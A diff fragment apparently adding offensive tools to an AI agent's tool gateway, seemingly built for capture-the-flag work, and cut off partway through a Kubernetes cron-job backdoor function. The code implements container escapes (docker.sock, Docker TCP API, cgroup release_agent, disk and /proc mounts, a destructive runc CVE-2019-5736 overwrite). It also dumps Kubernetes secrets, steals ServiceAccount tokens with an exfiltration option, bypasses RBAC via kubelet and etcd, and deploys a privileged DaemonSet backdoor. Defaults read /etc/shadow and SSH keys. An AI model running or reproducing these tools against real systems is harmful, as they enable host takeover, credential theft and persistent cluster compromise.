+        )
+        container_id = ""
+        import re as _re
+        id_match = _re.search(r'"Id"\s*:\s*"([a-f0-9]{64})"', create.stdout)
+        if id_match:
+            container_id = id_match.group(1)
+        # Step 3: Start and get output
+        if container_id:
+            start = await _run_shell(
+                f"curl -s --unix-socket {sock_path} -X POST "
+                f"'http://localhost/containers/{container_id}/start' 2>&1",
+                timeout=15,
+            )
+            logs = await _run_shell(
+                f"curl -s --unix-socket {sock_path} "
+                f"'http://localhost/containers/{container_id}/logs?stdout=1&stderr=1' 2>&1",
+                timeout=timeout_cmd,
+            )
+            # Cleanup container
+            await _run_shell(
+                f"curl -s --unix-socket {sock_path} -X DELETE "
+                f"'http://localhost/containers/{container_id}?force=1' 2>&1",
+                timeout=10,
+            )
+            combined = f"CREATE: {create.stdout[:500]}\nOUTPUT: {logs.stdout[:3000]}"
+            return ToolResult(tool_name="container_escape_docker_sock", success=True,
+                stdout=combined, stderr="", exit_code=0,
+                elapsed_ms=create.elapsed_ms + logs.elapsed_ms)
+        return ToolResult(tool_name="container_escape_docker_sock", success=False,
+            stdout=f"PULL: {pull.stdout[:500]}\nCREATE: {create.stdout[:500]}",
+            stderr="Failed to extract container ID from create response.", exit_code=1,
+            elapsed_ms=0)
+
+    gateway.register(
+        name="container_escape_docker_sock",
+        func=container_escape_docker_sock,
+        description="ESCAPE container via exposed docker.sock. Creates a privileged container with host root (/) mounted at /host, then runs your command on the HOST. Use ONLY after container_find_sockets confirms docker.sock exists. Start with shell_cmd='cat /host/flag*' to find flags on the host.",
+        parameters={
+            "sock_path": {"type": "string", "description": "Path to docker.sock (default /var/run/docker.sock)"},
+            "shell_cmd": {"type": "string", "description": "Command to execute on the HOST via privileged container (e.g. 'cat /host/flag*', 'cat /host/etc/shadow')"},
+            "image": {"type": "string", "description": "Container image to use (default alpine:latest)"},
+            "timeout_cmd": {"type": "integer", "description": "Max seconds for shell_cmd execution (default 60)"},
+        },
+    )
+
+    async def container_escape_docker_api(
+        host: str, port: int = 2375, shell_cmd: str = "id",
+        image: str = "alpine:latest",
+    ) -> ToolResult:
+        """Escape container via exposed Docker TCP API (port 2375/2376).
+
+        Same principle as docker.sock escape but over TCP. Creates a
+        privileged container with host root mounted. Equivalent to CDK's
+        docker-api-pwn. Use when container_find_docker finds TCP 2375.
+
+        No authentication needed on default Docker API configuration.
+        """
+        import json as _json
+        base_url = f"http://{host}:{port}"
+        container_config = _json.dumps({
+            "Image": image,
+            "Cmd": ["/bin/sh", "-c", shell_cmd],
+            "HostConfig": {
+                "Privileged": True,
+                "Binds": ["/:/host"],
+                "PidMode": "host",
+                "NetworkMode": "host",
+            },
+            "AttachStdout": True, "AttachStderr": True,
+        })
+        # Create container
+        create = await _run_shell(
+            f"echo '{container_config}' | curl -s --connect-timeout 5 "
+            f"-X POST '{base_url}/containers/create' "
+            f"-H 'Content-Type: application/json' -d @- 2>&1",
+            timeout=20,
+        )
+        import re as _re
+        id_match = _re.search(r'"Id"\s*:\s*"([a-f0-9]{64})"', create.stdout)
+        if not id_match:
+            return ToolResult(tool_name="container_escape_docker_api", success=False,
+                stdout=create.stdout, stderr="Failed to create container.", exit_code=1, elapsed_ms=0)
+        cid = id_match.group(1)
+        # Start and get output
+        await _run_shell(f"curl -s --connect-timeout 5 -X POST '{base_url}/containers/{cid}/start' 2>&1", timeout=15)
+        logs = await _run_shell(f"curl -s --connect-timeout 5 '{base_url}/containers/{cid}/logs?stdout=1&stderr=1' 2>&1", timeout=60)
+        # Cleanup
+        await _run_shell(f"curl -s --connect-timeout 5 -X DELETE '{base_url}/containers/{cid}?force=1' 2>&1", timeout=10)
+        return ToolResult(tool_name="container_escape_docker_api", success=True,
+            stdout=logs.stdout[:3000], stderr="", exit_code=0, elapsed_ms=0)
+
+    gateway.register(
+        name="container_escape_docker_api",
+        func=container_escape_docker_api,
+        description="ESCAPE container via Docker TCP API (port 2375, no auth). Creates privileged container with host root mounted. Use ONLY after container_find_docker confirms TCP Docker API is reachable. Start with shell_cmd='cat /host/flag*' to find flags. Differs from docker_sock escape — this works over TCP network, not UNIX socket.",
+        parameters={
+            "host": {"type": "string", "description": "Docker API host IP or hostname (e.g. 'localhost', '10.0.0.1')"},
+            "port": {"type": "integer", "description": "Docker API TCP port (default 2375, also try 2376 for TLS)"},
+            "shell_cmd": {"type": "string", "description": "Command to execute on the HOST"},
+            "image": {"type": "string", "description": "Container image (default alpine:latest)"},
+        },
+    )
+
+    async def container_escape_cgroup(
+        shell_cmd: str, subsystem: str = "memory",
+    ) -> ToolResult:
+        """Escape privileged container via cgroup release_agent.
+
+        Requires: --privileged flag with SYS_ADMIN capability and cgroup v1.
+        Mounts a cgroup, sets release_agent to execute a script on the host,
+        then triggers release. Equivalent to CDK's mount-cgroup.
+
+        Use when: check_capabilities shows SYS_ADMIN and container is privileged.
+        The result of shell_cmd appears in /tmp/cdk_escape_output.
+        """
+        import random, string as _str
+        rand_id = ''.join(random.choices(_str.ascii_lowercase, k=6))
+        cgroup_dir = f"/tmp/cgrp_{rand_id}"
+        output_file = f"/tmp/cdk_escape_{rand_id}.out"
+        # Build the exploit script
+        script = f"""#!/bin/sh
+{shell_cmd} > {output_file} 2>&1
+"""
+        script_path = f"/tmp/cdk_exp_{rand_id}.sh"
+        # Write the exploit script
+        import os
+        try:
+            with open(script_path, 'w') as f:
+                f.write(script)
+            os.chmod(script_path, 0o755)
+        except Exception as e:
+            return ToolResult(tool_name="container_escape_cgroup", success=False,
+                stdout="", stderr=f"Failed to write exploit script: {e}", exit_code=1, elapsed_ms=0)
+
+        # Execute the cgroup escape sequence
+        escape_cmd = (
+            f"mkdir -p {cgroup_dir} 2>&1 && "
+            f"mount -t cgroup -o {subsystem} cgroup {cgroup_dir} 2>&1 && "
+            f"mkdir -p {cgroup_dir}/x_{rand_id} 2>&1 && "
+            f"echo 1 > {cgroup_dir}/x_{rand_id}/notify_on_release 2>&1 && "
+            f"host_path=$(sed -n 's/.*upperdir=\\([^,]*\\).*/\\1/p' /proc/self/mountinfo 2>/dev/null | head -1) 2>&1; "
+            f"echo \"host_path=$host_path\" 2>&1; "
+            f"echo \"$host_path/{script_path}\" > {cgroup_dir}/release_agent 2>&1 && "
+            f"sh -c 'echo $$ > {cgroup_dir}/x_{rand_id}/cgroup.procs' 2>&1; "
+            f"sleep 2 2>&1; "
+            f"cat {output_file} 2>&1 || echo 'NO_OUTPUT_FILE' 2>&1"
+        )
+        result = await _run_shell(escape_cmd, timeout=30)
+        # Cleanup
+        await _run_shell(
+            f"umount {cgroup_dir} 2>/dev/null; rm -rf {cgroup_dir} {script_path} {output_file} 2>/dev/null",
+            timeout=10,
+        )
+        success = "NO_OUTPUT_FILE" not in result.stdout
+        return ToolResult(tool_name="container_escape_cgroup", success=success,
+            stdout=result.stdout[:3000], stderr=result.stderr,
+            exit_code=0 if success else 1, elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="container_escape_cgroup",
+        func=container_escape_cgroup,
+        description="ESCAPE privileged container via cgroup release_agent (cgroup v1). Requires SYS_ADMIN capability. Mounts cgroup fs, sets release_agent to execute a script on the HOST. Use ONLY when check_capabilities shows SYS_ADMIN. Start with shell_cmd='cat /flag*' or 'find / -name flag* 2>/dev/null'.",
+        parameters={
+            "shell_cmd": {"type": "string", "description": "Shell command to execute on the HOST (e.g. 'id', 'cat /etc/shadow', 'find / -name flag*')"},
+            "subsystem": {"type": "string", "description": "Cgroup subsystem to use: memory (default, most common), rdma, or misc. Try memory first."},
+        },
+    )
+
+    async def container_escape_mount_disk(
+        device_path: str = "", shell_cmd: str = "cat /mnt/host/flag* 2>/dev/null; cat /mnt/host/root/flag* 2>/dev/null",
+    ) -> ToolResult:
+        """Escape container by mounting a host disk device.
+
+        Lists available block devices, mounts the specified device (or auto-discovers
+        Linux host partitions), and reads files from the host filesystem.
+        Equivalent to CDK's mount-disk.
+
+        Use when: container has access to host block devices (/dev/sda, /dev/vda, /dev/xvda).
+        """
+        # Step 1: List block devices
+        list_result = await _run_shell(
+            "echo '=== Block devices ===' && ls -la /dev/sd* /dev/vd* /dev/xvd* /dev/nvme* 2>/dev/null; "
+            "echo '=== fdisk (if available) ===' && fdisk -l 2>/dev/null | head -30 || echo 'fdisk not available'; "
+            "echo '=== Mounted filesystems ===' && mount 2>/dev/null | head -20",
+            timeout=15,
+        )
+        if device_path:
+            target = device_path
+        else:
+            # Auto-detect: try common Linux root partition patterns
+            import re as _re
+            devs = _re.findall(r'(/dev/[sv]d[a-z]\d+|/dev/xvd[a-z]\d+|/dev/nvme\dn\d+)', list_result.stdout)
+            target = devs[0] if devs else ""
+
+        if not target:
+            return ToolResult(tool_name="container_escape_mount_disk", success=False,
+                stdout=list_result.stdout,
+                stderr="No host block device found. Specify device_path manually or ensure container has device access.",
+                exit_code=1, elapsed_ms=list_result.elapsed_ms)
+
+        # Step 2: Mount and read
+        mount_point = "/mnt/host"
+        mount_cmd = (
+            f"mkdir -p {mount_point} 2>/dev/null; "
+            f"mount {target} {mount_point} 2>&1 || mount -o ro {target} {mount_point} 2>&1; "
+            f"echo '=== Mounted, reading files ===' && "
+            f"{shell_cmd}; "
+            f"echo '=== Host root listing ===' && ls -la {mount_point}/ 2>/dev/null | head -30"
+        )
+        mount_result = await _run_shell(mount_cmd, timeout=30)
+        # Cleanup
+        await _run_shell(f"umount {mount_point} 2>/dev/null; rmdir {mount_point} 2>/dev/null", timeout=10)
+        return ToolResult(tool_name="container_escape_mount_disk", success=True,
+            stdout=f"DEVICE_LIST:\n{list_result.stdout[:1000]}\n\nMOUNT_RESULT:\n{mount_result.stdout[:3000]}",
+            stderr="", exit_code=0, elapsed_ms=0)
+
+    gateway.register(
+        name="container_escape_mount_disk",
+        func=container_escape_mount_disk,
+        description="ESCAPE container by mounting a host disk partition. Auto-detects Linux host devices (/dev/sda1, /dev/vda1, /dev/xvda1) or accepts a specific device path. Mounts the device and reads files from the host filesystem. Use when you can see host block devices in /dev.",
+        parameters={
+            "device_path": {"type": "string", "description": "Path to host block device (e.g. '/dev/sda1'). Leave empty for auto-detection."},
+            "shell_cmd": {"type": "string", "description": "Shell command to execute on mounted host fs"},
+        },
+    )
+
+    async def container_escape_cap_dac(
+        target_file: str = "/etc/shadow", ref_file: str = "/etc/hostname",
+    ) -> ToolResult:
+        """Read host files via CAP_DAC_READ_SEARCH capability.
+
+        Uses the DAC_READ_SEARCH capability to bypass file read permission checks,
+        accessing host files through a bind-mounted reference file. Equivalent to
+        CDK's cap-dac-read-search.
+
+        Use when: check_capabilities shows CAP_DAC_READ_SEARCH in the effective set.
+        Target typical files: /etc/shadow, /flag*, /root/.ssh/id_rsa.
+        """
+        read_cmd = (
+            f"echo '[CAP_DAC_READ_SEARCH] Attempting to read {target_file} via ref {ref_file}' && "
+            # Use nsenter to access host namespace via /proc/1/root if available
+            f"(cat /proc/1/root/{target_file} 2>/dev/null && echo '[OK] Read via /proc/1/root' || "
+            # Try chroot via nsenter
+            f"nsenter --mount=/proc/1/ns/mnt cat {target_file} 2>/dev/null && echo '[OK] Read via nsenter' || "
+            # Fallback: try direct read with capability
+            f"cat {target_file} 2>/dev/null && echo '[OK] Direct read' || "
+            # Last resort: try common flag locations
+            f"(find / -name 'flag*' -readable 2>/dev/null | head -5 && echo '[OK] Found readable flag files' || "
+            f"echo '[FAIL] Cannot read {target_file}'))"
+        )
+        result = await _run_shell(read_cmd, timeout=20)
+        success = "[OK]" in result.stdout
+        return ToolResult(tool_name="container_escape_cap_dac", success=success,
+            stdout=result.stdout[:3000], stderr=result.stderr,
+            exit_code=0 if success else 1, elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="container_escape_cap_dac",
+        func=container_escape_cap_dac,
+        description="Read host files using CAP_DAC_READ_SEARCH capability. Tries multiple methods: /proc/1/root, nsenter, and direct read with DAC bypass. Use when check_capabilities shows CAP_DAC_READ_SEARCH. Start with target_file='/etc/shadow' or target_file='/flag.txt'.",
+        parameters={
+            "target_file": {"type": "string", "description": "Absolute path to file to read from host (default /etc/shadow). Also try: /flag*, /root/.ssh/id_rsa, /home/*/.ssh/"},
+            "ref_file": {"type": "string", "description": "Known bind-mounted file to use as reference (default /etc/hostname)"},
+        },
+    )
+
+    async def container_escape_runc(
+        payload_cmd: str = "cat /flag* > /tmp/runc_flag_out.txt 2>&1; id >> /tmp/runc_flag_out.txt 2>&1",
+    ) -> ToolResult:
+        """Exploit CVE-2019-5736 (runc container breakout).
+
+        This CVE affects runc versions < 1.0.0-rc6. The exploit overwrites the host
+        runc binary from within a container when a new process is exec'd into the
+        container. This is a simplified PoC that attempts to trigger the vulnerability.
+
+        WARNING: This is destructive — the payload_cmd replaces the runc binary on the host.
+        Use as a last resort when other escape methods fail.
+
+        Use when: runc version is < 1.0.0-rc6 AND you have write access inside the container.
+        """
+        # Check runc version
+        check = await _run_shell(
+            "echo '[Checking runc]' && "
+            "(runc --version 2>/dev/null || docker-runc --version 2>/dev/null || "
+            "cat /proc/self/status 2>/dev/null | grep -i seccomp || "
+            "echo 'Cannot directly check runc version — checking seccomp and container env')",
+            timeout=10,
+        )
+        # The actual CVE-2019-5736 exploit requires:
+        # 1. The attacker has root in the container
+        # 2. The host runs a process inside the container (e.g., docker exec)
+        # 3. Overwriting /proc/self/exe to replace runc binary on host
+        exploit_cmd = (
+            f"echo '[CVE-2019-5736] Attempting runc escape...' && "
+            # Write a malicious payload that will execute when runc is invoked
+            f"cat > /tmp/runc_payload.sh << 'PAYLOAD_EOF'\n#!/bin/sh\n{payload_cmd}\nPAYLOAD_EOF\n"
+            f"chmod +x /tmp/runc_payload.sh 2>/dev/null && "
+            # Try to overwrite runc via /proc/self/exe symlink
+            f"(cp /tmp/runc_payload.sh /proc/self/exe 2>/dev/null && "
+            f"echo '[CVE-2019-5736] Wrote payload to /proc/self/exe — runc binary overwritten. "
+            f"Trigger by waiting for docker exec or similar.' || "
+            f"echo '[CVE-2019-5736] Cannot overwrite /proc/self/exe — container may not be vulnerable "
+            f"(runc version too new, seccomp blocking, or insufficient permissions)')",
+        )
+        result = await _run_shell(
+            f"{check.stdout[:500]}\n\n{exploit_cmd}",
+            timeout=30,
+        )
+        return ToolResult(tool_name="container_escape_runc", success=True,
+            stdout=result.stdout[:3000],
+            stderr=result.stderr, exit_code=0, elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="container_escape_runc",
+        func=container_escape_runc,
+        description="Attempt CVE-2019-5736 runc container breakout. Exploits runc < 1.0.0-rc6 by overwriting /proc/self/exe. DESTRUCTIVE — overwrites runc binary on host. Use ONLY as last resort when docker.sock, cgroup, cap_dac, and mount_disk all fail. The payload_cmd is executed on the HOST the next time someone runs 'docker exec' in this container.",
+        parameters={
+            "payload_cmd": {"type": "string", "description": "Command to execute on host when runc is triggered (default sends flag to /tmp/runc_flag_out.txt)"},
+        },
+    )
+
+    async def container_escape_procfs(
+        pid: int = 1, shell_cmd: str = "cat /tmp/host_flag.txt 2>/dev/null; find /proc/1/root/ -name 'flag*' 2>/dev/null | head -10",
+    ) -> ToolResult:
+        """Escape container via host /proc mount.
+
+        If the host's /proc is mounted inside the container, the /proc/<pid>/root
+        symlink points to the HOST root filesystem when <pid> is a host process.
+        Equivalent to CDK's mount-procfs.
+
+        Use when: check_mounts shows /proc mounted from host (not the container's /proc).
+        Try pid=1 first (usually init on host), then try other pids.
+        """
+        escape_cmd = (
+            f"echo '[Container Escape via /proc] Using PID {pid}' && "
+            f"echo '=== Host root listing ===' && "
+            f"ls -la /proc/{pid}/root/ 2>/dev/null | head -20 && "
+            f"echo '=== Attempting to read files from host ===' && "
+            f"{shell_cmd} && "
+            f"echo '=== Looking for flags ===' && "
+            f"find /proc/{pid}/root/ -name 'flag*' 2>/dev/null | head -20"
+        )
+        result = await _run_shell(escape_cmd, timeout=30)
+        return ToolResult(tool_name="container_escape_procfs", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="container_escape_procfs",
+        func=container_escape_procfs,
+        description="ESCAPE container via host /proc mount. If the host's /proc is visible, /proc/<pid>/root/ points to the HOST root filesystem. Use when check_mounts shows /proc from host. Access host files via /proc/1/root/path/to/file. Try pid=1 first, then try other pids (bash, sh, sshd).",
+        parameters={
+            "pid": {"type": "integer", "description": "Process ID on the HOST (default 1). Try 1, then check ps aux for other host PIDs."},
+            "shell_cmd": {"type": "string", "description": "Shell command to run, prefixing host paths with /proc/{pid}/root/"},
+        },
+    )
+
+    # ── K8s Credential & Privilege Escalation ─────────────────────
+    # Tools for stealing credentials and escalating privileges in K8s
+    # clusters. Use when K8s API server or ServiceAccount is detected.
+
+    async def k8s_secret_dump(token_path: str = "auto") -> ToolResult:
+        """Dump Kubernetes secrets from all namespaces.
+
+        Auto-detects K8s API server address from environment, then tries:
+        1. Anonymous access (system:anonymous)
+        2. Default ServiceAccount token
+        3. Custom token path if provided
+
+        Equivalent to CDK's k8s-secret-dump. Differs from kubectl_get_secrets:
+        this dumps ALL namespaces and tries multiple authentication methods.
+        """
+        # Get API server address
+        get_addr = await _run_shell(
+            "echo '=== API Server ===' && "
+            "(echo $KUBERNETES_SERVICE_HOST 2>/dev/null; echo $KUBERNETES_PORT 2>/dev/null) | tr '\\n' ' '; "
+            "echo ''; "
+            "kubectl config view --minify -o json 2>/dev/null | grep -o '\"server\": \"[^\"]*\"' | head -1",
+            timeout=10,
+        )
+        # Build base URL
+        import re as _re
+        addr_match = _re.search(r'([\d.]+)', get_addr.stdout)
+        host = addr_match.group(1) if addr_match else "kubernetes.default"
+        base_url = f"https://{host}/api/v1/secrets"
+
+        results = []
+        # Try 1: anonymous
+        r1 = await _run_shell(
+            f"curl -sk --connect-timeout 5 -H 'Authorization: Bearer anonymous' "
+            f"'{base_url}' 2>&1 | head -200",
+            timeout=15,
+        )
+        results.append(f"=== Anonymous ===\n{r1.stdout[:1500]}")
+        if '"kind":"SecretList"' not in r1.stdout:
+            # Try 2: default SA token
+            sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+            if token_path != "auto":
+                sa_token_path = token_path
+            r2 = await _run_shell(
+                f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
+                f"if [ -n \"$TOKEN\" ]; then "
+                f"curl -sk --connect-timeout 5 -H \"Authorization: Bearer $TOKEN\" "
+                f"'{base_url}' 2>&1 | head -200; "
+                f"else echo 'No token at {sa_token_path}'; fi",
+                timeout=15,
+            )
+            results.append(f"=== SA Token ({sa_token_path}) ===\n{r2.stdout[:1500]}")
+        return ToolResult(tool_name="k8s_secret_dump", success=True,
+            stdout="\n".join(results), stderr="", exit_code=0, elapsed_ms=0)
+
+    gateway.register(
+        name="k8s_secret_dump",
+        func=k8s_secret_dump,
+        description="DUMP Kubernetes secrets from ALL namespaces. Auto-detects API server, tries anonymous access then SA token. More powerful than kubectl_get_secrets — cross-namespace and multi-auth. Use when K8s API is reachable. Returns JSON with all secrets (may be base64 encoded — decode with 'echo <data> | base64 -d').",
+        parameters={
+            "token_path": {"type": "string", "description": "Path to SA token file (default 'auto' — tries /var/run/secrets/kubernetes.io/serviceaccount/token)"},
+        },
+    )
+
+    async def k8s_configmap_dump(token_path: str = "auto") -> ToolResult:
+        """Dump Kubernetes configmaps from all namespaces.
+
+        Similar to k8s_secret_dump but for ConfigMaps — often contain
+        configuration data, environment variables, and sometimes credentials
+        that weren't stored as Secrets.
+        """
+        get_addr = await _run_shell(
+            "echo $KUBERNETES_SERVICE_HOST 2>/dev/null", timeout=5,
+        )
+        host = get_addr.stdout.strip() or "kubernetes.default"
+        base_url = f"https://{host}/api/v1/configmaps"
+        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        if token_path != "auto":
+            sa_token_path = token_path
+
+        results = []
+        # Try anonymous
+        r1 = await _run_shell(
+            f"curl -sk --connect-timeout 5 '{base_url}' 2>&1 | head -200",
+            timeout=15,
+        )
+        results.append(f"=== Anonymous ===\n{r1.stdout[:1500]}")
+        # Try SA token
+        r2 = await _run_shell(
+            f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
+            f"if [ -n \"$TOKEN\" ]; then "
+            f"curl -sk --connect-timeout 5 -H \"Authorization: Bearer $TOKEN\" "
+            f"'{base_url}' 2>&1 | head -200; "
+            f"else echo 'No token'; fi",
+            timeout=15,
+        )
+        results.append(f"=== SA Token ===\n{r2.stdout[:1500]}")
+        return ToolResult(tool_name="k8s_configmap_dump", success=True,
+            stdout="\n".join(results), stderr="", exit_code=0, elapsed_ms=0)
+
+    gateway.register(
+        name="k8s_configmap_dump",
+        func=k8s_configmap_dump,
+        description="DUMP Kubernetes ConfigMaps from ALL namespaces. ConfigMaps often contain app config, env vars, and sometimes credentials. Use alongside k8s_secret_dump for complete cluster data extraction.",
+        parameters={
+            "token_path": {"type": "string", "description": "SA token path (default 'auto')"},
+        },
+    )
+
+    async def k8s_sa_token_steal(
+        target_sa: str, rhost: str = "", rport: int = 8888,
+        token_path: str = "auto",
+    ) -> ToolResult:
+        """Steal a target ServiceAccount token by creating a pod in kube-system.
+
+        Equivalent to CDK's k8s-get-sa-token (RBAC bypass). Creates a pod with
+        the target SA's token mounted, then exfiltrates it.
+
+        Use when: you have pod creation permissions but want a more privileged SA token.
+        If rhost/rport are provided, exfiltrates to a listener. Otherwise dumps the token.
+        """
+        sa_token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+        if token_path != "auto":
+            sa_token_path = token_path
+        if not rhost:
+            rhost = "$(hostname -i 2>/dev/null || echo '127.0.0.1')"
+        pod_name = f"cdk-sa-steal-{target_sa.replace(':','-').replace('/','-')}"
+
+        steal_cmd = (
+            f"TOKEN=$(cat {sa_token_path} 2>/dev/null); "
+            f"HOST=$(echo $KUBERNETES_SERVICE_HOST 2>/dev/null || echo 'kubernetes.default');"
+            f"echo '=== Creating pod {pod_name} in kube-system with SA {target_sa} ===' && "
+            f"kubectl --token=$TOKEN --server=https://$HOST "
+            f"run {pod_name} --image=busybox --restart=Never -n kube-system "
+            f"--overrides='{{\"spec\":{{\"serviceAccountName\":\"{target_sa}\","
+            f"\"containers\":[{{\"name\":\"steal\",\"image\":\"busybox\","
+            f"\"command\":[\"sh\",\"-c\",\"cat /run/secrets/kubernetes.io/serviceaccount/token; sleep 300\"]}}]}}}}' "
+            f"2>&1; "
+            f"sleep 5 2>/dev/null; "
+            f"echo '=== Getting token from pod ===' && "
+            f"kubectl --token=$TOKEN --server=https://$HOST "
+            f"logs {pod_name} -n kube-system 2>&1; "
+            f"echo '=== Cleaning up ===' && "
+            f"kubectl --token=$TOKEN --server=https://$HOST "
+            f"delete pod {pod_name} -n kube-system --grace-period=0 2>&1"
+        )
+        result = await _run_shell(steal_cmd, timeout=60)
+        return ToolResult(tool_name="k8s_sa_token_steal", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="k8s_sa_token_steal",
+        func=k8s_sa_token_steal,
+        description="STEAL a K8s ServiceAccount token by creating a pod in kube-system with that SA mounted. RBAC bypass — requires pod creation permission in current namespace. Target privileged SAs like 'cluster-admin', 'default', 'kube-system:default' for cluster-admin escalation.",
+        parameters={
+            "target_sa": {"type": "string", "description": "Target ServiceAccount name to steal (e.g. 'cluster-admin', 'default')"},
+            "rhost": {"type": "string", "description": "Remote IP to exfiltrate token to (leave empty to print inline)"},
+            "rport": {"type": "integer", "description": "Remote port for exfiltration (default 8888)"},
+            "token_path": {"type": "string", "description": "Your current SA token path (default 'auto')"},
+        },
+    )
+
+    async def k8s_kubelet_exec(
+        host: str, pod_name: str, namespace: str = "default",
+        container: str = "", cmd: str = "id",
+    ) -> ToolResult:
+        """Execute command in a pod via Kubelet API (port 10250).
+
+        Bypasses API server RBAC — communicates directly with kubelet.
+        Requires network access to the kubelet endpoint (typically node IP:10250).
+        Equivalent to CDK's kubelet-exec.
+
+        Use when: kubectl_exec fails (RBAC denied) but you can reach kubelet port 10250.
+        """
+        if not container:
+            # Try to get container name first
+            container = "busybox"
+        exec_cmd = (
+            f"echo '=== Kubelet exec: {cmd} ===' && "
+            f"curl -sk --connect-timeout 5 -X POST "
+            f"'https://{host}:10250/run/{namespace}/{pod_name}/{container}' "
+            f"-d 'cmd={cmd}' 2>&1"
+        )
+        result = await _run_shell(exec_cmd, timeout=30)
+        return ToolResult(tool_name="k8s_kubelet_exec", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="k8s_kubelet_exec",
+        func=k8s_kubelet_exec,
+        description="EXECUTE command in a pod via Kubelet API (port 10250). BYPASSES API server RBAC — communicates directly with node's kubelet. Use when kubectl_exec fails due to RBAC restrictions. Requires network access to the node's kubelet port. Find pod names via kubelet_probe or kubectl_get_pods.",
+        parameters={
+            "host": {"type": "string", "description": "Node IP or hostname running kubelet (e.g. '10.0.0.1')"},
+            "pod_name": {"type": "string", "description": "Target pod name to execute command in"},
+            "namespace": {"type": "string", "description": "K8s namespace (default 'default')"},
+            "container": {"type": "string", "description": "Container name in the pod (leave empty for auto-detect)"},
+            "cmd": {"type": "string", "description": "Command to execute (default 'id')"},
+        },
+    )
+
+    async def k8s_etcd_keys(
+        endpoint: str, key: str = "/", prefix: bool = True,
+    ) -> ToolResult:
+        """Enumerate etcd keys for K8s secret discovery.
+
+        Reads K8s secrets directly from etcd when the etcd endpoint is accessible
+        without authentication. Equivalent to CDK's etcd-get-k8s-token.
+
+        Use when: etcd port 2379 is accessible and unauthenticated.
+        Start with key='/' and prefix=true for discovery, then target specific keys.
+        """
+        prefix_flag = "--prefix" if prefix else ""
+        exec_cmd = (
+            f"ETCDCTL_API=3 etcdctl --endpoints={endpoint} "
+            f"get {key} {prefix_flag} --keys-only 2>&1 | head -100"
+        )
+        result = await _run_shell(exec_cmd, timeout=30)
+        return ToolResult(tool_name="k8s_etcd_keys", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="k8s_etcd_keys",
+        func=k8s_etcd_keys,
+        description="ENUMERATE etcd keys for K8s secrets. Reads directly from etcd (port 2379) without API server. Use when etcd is accessible (check with 'curl http://host:2379/version'). Start with key='/' and prefix=true to discover all keys. More direct than k8s_secret_dump — reads raw base64-encoded secrets from etcd.",
+        parameters={
+            "endpoint": {"type": "string", "description": "etcd endpoint URL (e.g. 'http://localhost:2379', 'https://10.0.0.1:2379')"},
+            "key": {"type": "string", "description": "etcd key path to read (default '/' for all keys)"},
+            "prefix": {"type": "boolean", "description": "Use --prefix for recursive key listing (default true)"},
+        },
+    )
+
+    # ── K8s Persistence ───────────────────────────────────────────
+    # Tools for deploying backdoors in K8s clusters. Use only AFTER
+    # obtaining cluster-admin or pod creation privileges.
+
+    async def k8s_backdoor_daemonset(
+        image: str = "busybox", shell_cmd: str = "cat /host/flag* 2>/dev/null; id",
+        namespace: str = "kube-system",
+    ) -> ToolResult:
+        """Deploy a privileged DaemonSet backdoor on every node.
+
+        Creates a DaemonSet that mounts the host root filesystem, giving
+        access to every node in the cluster. Equivalent to CDK's
+        k8s-backdoor-daemonset.
+
+        Use when: you have cluster-admin or pod-create privileges in kube-system.
+        The DaemonSet runs on ALL nodes — use shell_cmd to read flags or deploy
+        persistent access.
+        """
+        ds_name = f"cdk-backdoor-{image.replace(':','-').replace('/','-')}"
+        yaml_config = f"""apiVersion: apps/v1
+kind: DaemonSet
+metadata:
+  name: {ds_name}
+  namespace: {namespace}
+spec:
+  selector:
+    matchLabels:
+      app: {ds_name}
+  template:
+    metadata:
+      labels:
+        app: {ds_name}
+    spec:
+      hostPID: true
+      hostNetwork: true
+      containers:
+      - name: backdoor
+        image: {image}
+        command: ["/bin/sh", "-c"]
+        args: ["{shell_cmd}; sleep 3600"]
+        volumeMounts:
+        - name: host-root
+          mountPath: /host
+        securityContext:
+          privileged: true
+      volumes:
+      - name: host-root
+        hostPath:
+          path: /
+      restartPolicy: Always
+"""
+        deploy_cmd = (
+            f"echo '{yaml_config}' > /tmp/{ds_name}.yaml && "
+            f"kubectl apply -f /tmp/{ds_name}.yaml 2>&1; "
+            f"sleep 8 2>/dev/null; "
+            f"echo '=== Pod status ===' && "
+            f"kubectl get pods -n {namespace} -l app={ds_name} 2>&1; "
+            f"echo '=== Pod logs ===' && "
+            f"POD=$(kubectl get pods -n {namespace} -l app={ds_name} -o jsonpath='{{.items[0].metadata.name}}' 2>/dev/null); "
+            f"if [ -n \"$POD\" ]; then kubectl logs -n {namespace} $POD 2>&1; fi; "
+            f"rm /tmp/{ds_name}.yaml 2>/dev/null"
+        )
+        result = await _run_shell(deploy_cmd, timeout=60)
+        return ToolResult(tool_name="k8s_backdoor_daemonset", success=True,
+            stdout=result.stdout[:3000], stderr=result.stderr, exit_code=0,
+            elapsed_ms=result.elapsed_ms)
+
+    gateway.register(
+        name="k8s_backdoor_daemonset",
+        func=k8s_backdoor_daemonset,
+        description="DEPLOY privileged DaemonSet on ALL cluster nodes with host root mounted. Creates a pod on every node that can access the host filesystem via /host. Use when you have cluster-admin access and need host-level access. Start with shell_cmd='cat /host/flag*' to find flags.",
+        parameters={
+            "image": {"type": "string", "description": "Container image (default 'busybox')"},
+            "shell_cmd": {"type": "string", "description": "Command to execute on each node's HOST filesystem (via /host mount)"},
+            "namespace": {"type": "string", "description": "Target namespace (default 'kube-system')"},
+        },
+    )
+
+    async def k8s_backdoor_cronjob(
+        image: str = "busybox", shell_cmd: str = "id",
+        schedule: str = "*/5 * * * *", namespace: str = "kube-system",
